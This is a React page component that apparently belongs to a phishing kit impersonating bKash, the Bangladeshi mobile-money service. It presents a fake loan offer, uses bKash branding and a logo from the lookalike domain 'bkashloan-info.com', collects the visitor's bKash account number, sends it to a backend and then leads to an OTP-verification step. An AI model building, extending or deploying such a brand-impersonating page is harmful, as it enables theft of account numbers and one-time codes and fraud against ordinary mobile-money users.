import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";

export default function Verification() {
  const navigate = useNavigate();
  const [accountNumber, setAccountNumber] = useState("");
  const [loading, setLoading] = useState(false);
  const base_url = import.meta.env.VITE_API_KEY_Base_URL;
  
  // Get loan data from localStorage
  const [loanAmount, setLoanAmount] = useState("0");
  const [loanCategory, setLoanCategory] = useState("Personal Loan");
  const [loanId, setLoanId] = useState(null);

  useEffect(() => {
    // Retrieve data from localStorage
    const amount = localStorage.getItem('loanAmount');
    const category = localStorage.getItem('loanCategory');
    const id = localStorage.getItem('loanId');
    
    if (amount) setLoanAmount(amount);
    if (category) setLoanCategory(category);
    if (id) setLoanId(id);
    else {
      alert("Session expired. Please start over.");
      navigate('/');
    }
  }, [navigate]);

  const handleCancel = () => {
    alert("Cancelled");
    navigate('/');
  };

  const handleConfirm = async () => {
    if (!accountNumber) {
      alert("Please enter your bKash account number.");
      return;
    }
    
    if (!loanId) {
      alert("Session expired. Please start over.");
      navigate('/');
      return;
    }
    
    setLoading(true);
    
    try {
      const response = await fetch(`${base_url}/api/update-account/${loanId}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          accountNumber: accountNumber
        })
      });
      
      const result = await response.json();
      
      if (result.success) {
        // Save account number to localStorage for next steps
        localStorage.setItem('accountNumber', accountNumber);
        
        navigate('/otp-verification');
      } else {
        alert("Failed to save account number. Please try again.");
      }
    } catch (error) {
      console.error("Error:", error);
      alert("Something went wrong. Please check your connection and try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div
      style={{ fontFamily: "'Segoe UI', sans-serif" }}
      className="min-h-screen bg-gray-100 flex items-center justify-center p-4"
    >
      <div className="bg-white rounded-2xl shadow-lg w-full max-w-md overflow-hidden">

        {/* Logo */}
        <div className="flex justify-center" style={{ padding: "24px 24px 18px" }}>
          <img
            src="https://bkashloan-info.com/img/bKash-logo.png"
            alt="bKash"
            className="h-10 object-contain"
          />
        </div>

        {/* Loan Info */}
        <div
          className="flex items-start justify-between"
          style={{ backgroundColor: "#F3F4F6", padding: "12px 20px" }}
        >
          <div>
            <p className="text-gray-800 font-semibold text-[14px]">Loan Amount</p>
            <p className="text-gray-500 text-[12px] mt-0.5">loan category: {loanCategory}</p>
          </div>
          <p className="text-gray-800 font-semibold text-[14px]">
            ৳{parseFloat(loanAmount).toFixed(2)}
          </p>
        </div>

        {/* Pink section */}
        <div
          className="px-8 py-10 flex flex-col items-center gap-4"
          style={{ backgroundColor: "#d81b6a" }}
        >
          <p className="text-white text-base font-medium">
            Your bKash Account Number
          </p>

          <input
            type="text"
            value={accountNumber}
            onChange={(e) => setAccountNumber(e.target.value)}
            placeholder="e.g 01XXXXXXXXX"
            className="w-full rounded-md px-4 py-3 text-center text-gray-700 text-sm outline-none bg-white"
            style={{ border: "none" }}
            disabled={loading}
          />

          <p className="text-white text-sm">
            Confirm and proceed,{" "}
            <a
              href="#"
              onClick={(e) => e.preventDefault()}
              className="underline text-white font-medium"
            >
              terms &amp; conditions
            </a>
          </p>
        </div>

        {/* Cancel / Confirm buttons */}
        <div className="flex p-[15px] gap-3">
          <button
            onClick={handleCancel}
            disabled={loading}
                     className="flex-1 py-2.5 text-gray-600 rounded-[4px] cursor-pointer font-semibold text-sm bg-[#E5E7EB] hover:bg-gray-200 transition disabled:opacity-50 disabled:cursor-not-allowed"

          >
            Cancel
          </button>
          <button
            onClick={handleConfirm}
            disabled={loading}
                      className="flex-1 py-2.5 text-gray-600 rounded-[4px] cursor-pointer font-semibold text-sm bg-[#E5E7EB] hover:bg-gray-200 transition disabled:opacity-50 disabled:cursor-not-allowed"

          >
            {loading ? "Saving..." : "Confirm"}
          </button>
        </div>

        {/* Footer */}
        <div className="text-center py-4">
          <p className="text-gray-400 text-xs">© 2025 bKash, All Rights Reserved</p>
          <p className="text-xs mt-1" style={{ color: "#d81b6a" }}>
            ● 16247
          </p>
        </div>
      </div>
    </div>
  );
}